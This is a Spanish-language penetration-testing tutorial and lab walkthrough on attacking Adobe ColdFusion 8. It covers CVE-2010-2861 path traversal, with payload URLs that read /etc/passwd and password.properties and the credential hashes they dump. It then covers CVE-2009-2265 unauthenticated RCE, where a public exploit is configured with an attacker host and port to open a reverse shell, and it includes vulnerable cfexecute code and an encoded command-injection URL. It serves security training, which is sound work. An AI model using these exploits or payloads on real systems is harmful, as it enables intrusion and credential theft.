
# Coldfusion - Ataques

Ahora que sabemos que ColdFusion 8 es un objetivo, el siguiente paso es comprobar si existen exploits conocidos. `Searchsploit`es una herramienta de línea de comandos para `searching and finding exploits`la base de datos de exploits. Forma parte del proyecto Exploit Database, una organización sin ánimo de lucro que ofrece un repositorio público de exploits y software vulnerable. `Searchsploit`busca en la base de datos de exploits y devuelve una lista de exploits y sus detalles relevantes, incluido el nombre del exploit, su descripción y la fecha de publicación.

### **Searchsploit**

```shell-session
afsh4ck@kali$ searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Como sabemos, la versión de ColdFusion que se está ejecutando es `ColdFusion 8`, y hay dos resultados de interés. Los resultados `Adobe ColdFusion - Directory Traversal` y `Adobe ColdFusion 8 - Remote Command Execution (RCE)`.

***

## <mark style="color:purple;">Path Traversal</mark>

`Directory/Path Traversal` es un ataque que permite a un atacante acceder a archivos y directorios fuera del directorio previsto en una aplicación web. El ataque explota la falta de validación de entrada en una aplicación web y puede ejecutarse a través de varios `inputs` como `parámetros de URL`, `campos de formulario`, `cookies`, y más.&#x20;

Al manipular los parámetros de entrada, el atacante puede recorrer la estructura de directorios de la aplicación web y `access sensitive files`, incluidos `configuration files`, `user data`, y otros archivos del sistema. El ataque puede ejecutarse manipulando los parámetros de entrada en las etiquetas ColdFusion como `CFFile` y `CFDIRECTORY`, que se utilizan para operaciones de archivos y directorios como cargar, descargar y enumerar archivos.

Aquí un fragmento de código de ColdFusion:

```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

En este fragmento de código, la etiqueta `cfdirectory` de ColdFusion enumera el contenido del directorio `uploads` y `cfloop` se utiliza para recorrer los resultados de la consulta y mostrar los nombres de los archivos como enlaces en los que se puede hacer clic en HTML.

Sin embargo, el parámetro `directory` no se valida correctamente, lo que hace que la aplicación sea vulnerable a un ataque Path Traversal. Un atacante puede aprovechar esta vulnerabilidad manipulando el parámetro `directory` para acceder a archivos fuera del directorio `uploads`.

```http
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

En este ejemplo, la `../`secuencia se utiliza para navegar por el árbol de directorios y acceder al archivo `/etc/passwd` fuera de la ubicación prevista.

`CVE-2010-2861` es el exploit `Adobe ColdFusion - Directory Traversal` descubierto por `searchsploit`. Es una vulnerabilidad en ColdFusion que permite a los atacantes realizar ataques de cruce de ruta.

* `CFIDE/administrator/settings/mappings.cfm`
* `logging/settings.cfm`
* `datasources/index.cfm`
* `j2eepackaging/editarchive.cfm`
* `CFIDE/administrator/enter.cfm`

Estos archivos ColdFusion son vulnerables a un ataque de recorrido de directorio en `Adobe ColdFusion 9.0.1`y `earlier versions`. Los atacantes remotos pueden aprovechar esta vulnerabilidad para leer archivos arbitrarios mediante la manipulación de `locale parameter`estos archivos ColdFusion específicos.

Con esta vulnerabilidad, los atacantes pueden acceder a archivos fuera del directorio previsto mediante la inclusión `../`de secuencias en el parámetro de archivo. Por ejemplo, considere la siguiente URL:

```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
```

En este ejemplo, la URL intenta acceder al archivo `mappings.cfm` en el directorio `/CFIDE/administrator/settings/` de la aplicación web con una configuración `en` regional específica. Sin embargo, se puede ejecutar un ataque de path traversal manipulando el parámetro de configuración regional de la URL, lo que permite a un atacante leer archivos arbitrarios ubicados fuera del directorio deseado, como archivos de configuración o archivos del sistema.

```http
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

En este ejemplo, las secuencias `../` se han utilizado para reemplazar una `locale` válida para recorrer la estructura del directorio y acceder al archivo `passwd` ubicado en el directorio `/etc/`.

Usando `searchsploit`, copie el exploit a un directorio de trabajo y luego ejecute el archivo para ver qué argumentos requiere.

```shell-session
afsh4ck@kali$ searchsploit -p 14641

  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable

Copied EDB-ID #14641's path to the clipboard
```

**Coldfusion - Explotación**

```shell-session
afsh4ck@kali$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
afsh4ck@kali$ python2 14641.py 

usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed
```

El archivo `password.properties` de ColdFusion es un archivo de configuración que almacena de forma segura contraseñas cifradas para varios servicios y recursos que utiliza el servidor ColdFusion. Contiene una lista de pares clave-valor, donde la clave representa el nombre del recurso y el valor es la contraseña cifrada. Estas contraseñas cifradas se utilizan para servicios como `database connections`, `mail servers`, `LDAP servers` y otros recursos que requieren autenticación. Al almacenar contraseñas cifradas en este archivo, ColdFusion puede recuperarlas y utilizarlas automáticamente para autenticarse con los servicios respectivos sin necesidad de introducir manualmente las contraseñas cada vez. El archivo suele estar en el directorio `[cf_root]/lib` y se puede gestionar a través del Administrador de ColdFusion.

Al proporcionar los parámetros correctos al script de explotación y especificar la ruta del archivo deseado, el script puede activar un exploit en los puntos finales vulnerables mencionados anteriormente. El script mostrará el resultado del intento de explotación:

**Coldfusion - Explotación**

```shell-session
afsh4ck@kali$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
```

Como podemos ver, se ha recuperado el contenido del archivo `password.properties`, lo que demuestra que este objetivo es vulnerable a `CVE-2010-2861`.

***

## <mark style="color:purple;">RCE no autenticado</mark>

La ejecución remota de código no autenticado ( `RCE`) es un tipo de vulnerabilidad de seguridad que permite a un atacante `ejecutar código arbitrario` en un sistema vulnerable `sin autenticación`. Este tipo de vulnerabilidad puede tener consecuencias graves, ya que permite a un atacante `tomar el control total del sistema` y potencialmente robará datos confidenciales o provocará daños al sistema.

La diferencia entre un `RCE` y un `Unauthenticated Remote Code Execution` es si un atacante necesita o no proporcionar credenciales de autenticación válidas para explotar la vulnerabilidad. Una vulnerabilidad RCE permite a un atacante ejecutar código arbitrario en un sistema de destino, independientemente de si tiene o no credenciales válidas. Sin embargo, en muchos casos, las vulnerabilidades RCE requieren que el atacante ya tenga acceso a alguna parte del sistema, ya sea a través de una cuenta de usuario u otros medios.

Por el contrario, una vulnerabilidad RCE no autenticada permite a un atacante ejecutar código arbitrario en un sistema de destino sin credenciales de autenticación válidas. Esto hace que este tipo de vulnerabilidad sea particularmente peligrosa, ya que un atacante puede potencialmente tomar el control de un sistema o ejecutar comandos maliciosos sin ninguna barrera de entrada.

En el contexto de las aplicaciones web ColdFusion, un ataque RCE no autenticado ocurre cuando un atacante puede ejecutar código arbitrario en el servidor sin requerir autenticación. Esto puede suceder cuando una aplicación web permite la ejecución de código arbitrario a través de una característica o función que no requiere autenticación, como una consola de depuración o una funcionalidad de carga de archivos. Considere el siguiente código:

```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

En el código anterior, la variable `cmd` se crea concatenando la variable `cgi.query_string` con un comando que se va a ejecutar. Luego, este comando se ejecuta utilizando la función `cfexecute`, que ejecuta el programa de Windows `cmd.exe` con los argumentos especificados. Este código es vulnerable a un ataque RCE no autenticado porque no valida correctamente la variable `cmd` antes de ejecutarla ni requiere que el usuario esté autenticado. Un atacante podría simplemente pasar un comando malicioso como variable `cgi.query_string` y el servidor lo ejecutaría.

```http
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

Esta URL incluye un punto y coma (`%3B`) al comienzo de la cadena de consulta, lo que puede permitir la ejecución de varios comandos en el servidor. Esto podría agregar funcionalidad legítima con un comando no deseado. El comando `echo` incluido imprime un mensaje en la consola y va seguido de un comando de redirección para escribir un archivo en el directorio `C:` con un mensaje que indica que el servidor ha sido comprometido.

Un ejemplo de un ataque RCE no autenticado de ColdFusion es la vulnerabilidad `CVE-2009-2265` que afectó a las versiones 8.0.1 y anteriores de Adobe ColdFusion. Esta vulnerabilidad permitía a usuarios no autenticados cargar archivos y obtener ejecución remota de código en el host de destino. La vulnerabilidad existe en el paquete FCKeditor y se puede acceder a ella en la siguiente ruta:

```http
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

`CVE-2009-2265`es la vulnerabilidad identificada por nuestra búsqueda anterior en SearchSploit como `Adobe ColdFusion 8 - Remote Command Execution (RCE)`. Introdúzcala en un directorio de trabajo.

### **Descarga del exploit**

```shell-session
afsh4ck@kali$ searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057's path to the clipboard
```

```shell-session
afsh4ck@kali$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Una revisión `cat` rápida del código indica que el script necesita cierta información. Establezca la información correcta y ejecute el exploit.

### **Modificación del exploit**

```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

El exploit tardará un poco en ejecutarse, pero eventualmente devolverá un shell remoto funcional.

### **Explotación**

```shell-session
afsh4ck@kali$ python3 50057.py 

Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Priting request...
Content-type: multipart/form-data; boundary=77c732cb2f394ea79c71d42d50274368
Content-length: 1698

--77c732cb2f394ea79c71d42d50274368

<SNIP>

--77c732cb2f394ea79c71d42d50274368--


Sending request and printing response...


		<script type="text/javascript">
			window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt", "1269fd7bd2b341fab6751ec31bbfb610.txt", "0" );
		</script>
	

Printing some information for debugging...
lhost: 10.10.14.55
lport: 4444
rhost: 10.129.247.30
rport: 8500
payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.247.30.
Ncat: Connection from 10.129.247.30:49866.
```

### **Reverse Shell**

```cmd-session
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\ColdFusion8\runtime\bin

22/03/2017  08:53 ��    <DIR>          .
22/03/2017  08:53 ��    <DIR>          ..
18/03/2008  11:11 ��            64.512 java2wsdl.exe
19/01/2008  09:59 ��         2.629.632 jikes.exe
18/03/2008  11:11 ��            64.512 jrun.exe
18/03/2008  11:11 ��            71.680 jrunsvc.exe
18/03/2008  11:11 ��             5.120 jrunsvcmsg.dll
18/03/2008  11:11 ��            64.512 jspc.exe
22/03/2017  08:53 ��             1.804 jvm.config
18/03/2008  11:11 ��            64.512 migrate.exe
18/03/2008  11:11 ��            34.816 portscan.dll
18/03/2008  11:11 ��            64.512 sniffer.exe
18/03/2008  11:11 ��            78.848 WindowsLogin.dll
18/03/2008  11:11 ��            64.512 wsconfig.exe
22/03/2017  08:53 ��             1.013 wsconfig_jvm.config
18/03/2008  11:11 ��            64.512 wsdl2java.exe
18/03/2008  11:11 ��            64.512 xmlscript.exe
              15 File(s)      3.339.009 bytes
               2 Dir(s)   1.432.776.704 bytes free
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.126.9
```

> ¿Bajo qué usuario se ejecuta ColdFusion?

### Escaneo de puertos

```bash
sudo nmap -v -sV -T5 10.129.126.9                

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Tenemos 3 puertos abiertos, y nos centraremos en el 8500.

Al entrar por el navegador observamos 2 directorios propios de Cold Fusion, lo que nos indica su presencia en el sistema:

<figure><img src="/files/CCG2iCXeVdM1KH6V2AWP" alt=""><figcaption></figcaption></figure>

### Path traversal

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .

ls
14641.py

python2 14641.py 
usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed
```

```bash
python2 14641.py 10.129.126.9 8500 ../../../../../../../lib/password.properties

------------------------------
trying /CFIDE/administrator/entman/index.cfm
title from server in /CFIDE/administrator/entman/index.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
trying /CFIDE/administrator/enter.cfm
title from server in /CFIDE/administrator/enter.cfm:
------------------------------
<----SNIP---->
```

Vemos que es vulnerable y nos vuelca una contraseña de administrador. Probamos esa contraseña en el directorio `CFDE/administrator` pero no conseguimos acceder, por lo que probaremos otra técnica.

<figure><img src="/files/Z6k6huFGVvMugbxYlxHL" alt=""><figcaption></figcaption></figure>

### RCE no autorizado

```bash
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Modificamos el script de esta manera:

```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.15.127'
    lport = 4444
    rhost = "10.129.126.9"
    rport = 8500
    filename = uuid.uuid4().hex
```

Y ejecutamos el exploit:

```bash
python3 50057.py

Printing some information for debugging...
lhost: 10.10.15.127
lport: 4444
rhost: 10.129.126.9
rport: 8500
payload: 3608e36153eb4f7fa5000f8656d609c8.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
connect to [10.10.15.127] from (UNKNOWN) [10.129.126.9] 49283

--------------------------------------------

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin> whoami
whoami
arctic\tolis
```

Conseguimos una reverse shell y vemos que somos el usuario `arctic/tolis`.
